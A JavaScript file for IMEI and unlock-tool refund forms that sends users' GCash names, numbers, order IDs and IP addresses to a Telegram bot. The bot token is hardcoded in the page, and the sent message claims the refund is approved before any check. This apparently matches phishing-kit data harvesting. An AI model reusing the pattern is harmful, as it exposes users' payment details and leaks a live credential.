// Function to get the client's IP address
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return 'Unknown';
    }
}

// Function to open the modal based on type and name
function openModal(type, name) {
    document.getElementById('modalOverlay').style.display = 'block';
    if (type === 'imei') {
        document.getElementById('imeiModal').style.display = 'block';
        document.getElementById('imeiItemName').value = name;
    } else if (type === 'unlockTool') {
        document.getElementById('unlockToolModal').style.display = 'block';
        document.getElementById('unlockToolItemName').value = name;
    }
}

// Function to close the modal
function closeModal() {
    document.getElementById('modalOverlay').style.display = 'none';
    document.getElementById('imeiModal').style.display = 'none';
    document.getElementById('unlockToolModal').style.display = 'none';
}

// Function to send message to Telegram and redirect
function sendToTelegram(message, successRedirectUrl) {
    const botToken = '7629739770:AAEvP7NK4M9Cua3X4norSzqQS2y2Edrdy3Q';
    const chatId = '6892566157';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
        .then(response => {
            if (response.ok) {
                window.location.href = successRedirectUrl;
            } else {
                alert("Failed to submit your order.");
            }
        })
        .catch(error => console.error("Error:", error));
}

// Function to check if the user can submit again
function canSubmitAgain() {
    const lastSubmitTime = localStorage.getItem('lastSubmitTime');
    if (!lastSubmitTime) {
        return true; // Allow if no previous submission time is found
    }

    const currentTime = Date.now();
    const timeElapsed = currentTime - lastSubmitTime;
    return timeElapsed >= 2 * 60 * 1000; // 2 minutes (in milliseconds)
}

// Function to update the last submit time in localStorage
function updateLastSubmitTime() {
    const currentTime = Date.now();
    localStorage.setItem('lastSubmitTime', currentTime);
}

// Event listener for IMEI refund form submission
document.getElementById('imeiForm').addEventListener('submit', function (event) {
    event.preventDefault();

    if (!canSubmitAgain()) {
        alert("You can only submit a refund request once every 2 minutes.");
        return; // Exit if 2 minutes have not passed since the last submission
    }

    getClientIP().then((customerIP) => {
        const itemName = document.getElementById('imeiItemName').value;
        const orderId = document.getElementById('imeiOrderId').value;
        const gcashName = document.getElementById('imeiGcashName').value;
        const gcashNumber = document.getElementById('imeiGcashNumber').value;

        const message = `GENTECH SERVER\n

Item: ${itemName}\n
Refund Amount: ₱600\n
Order ID: ${orderId}\n
Gcash Name: ${gcashName}\n
Gcash Number: ${gcashNumber}\n
IP Address: ${customerIP}\n

Your refund request has been successfully processed and approved. Thank you for your patience and understanding. If you have any further questions or need assistance, please feel free to contact our support team. Thank you for choosing our service.`;

        sendToTelegram(message, 'success.html');
        updateLastSubmitTime(); // Update the last submission time
        closeModal();
    });
});

// Event listener for Unlock Tool refund form submission
document.getElementById('unlockToolForm').addEventListener('submit', function (event) {
    event.preventDefault();

    if (!canSubmitAgain()) {
        alert("You can only submit a refund request once every 2 minutes.");
        return; // Exit if 2 minutes have not passed since the last submission
    }

    getClientIP().then((customerIP) => {
        const itemName = document.getElementById('unlockToolItemName').value;
        const orderId = document.getElementById('unlockToolOrderId').value;
        const gcashName = document.getElementById('unlockToolGcashName').value;
        const gcashNumber = document.getElementById('unlockToolGcashNumber').value;

        const message = `GENTECH SERVER\n

Item: ${itemName}\n
Refund Amount: ₱\n
Order ID: ${orderId}\n
Gcash Name: ${gcashName}\n
Gcash Number: ${gcashNumber}\n
IP Address: ${customerIP}\n

Your refund request has been successfully processed and approved. Thank you for your patience and understanding. If you have any further questions or need assistance, please feel free to contact our support team. Thank you for choosing our service.`;

        sendToTelegram(message, 'success.html');
        updateLastSubmitTime(); // Update the last submission time
        closeModal();
    });
});
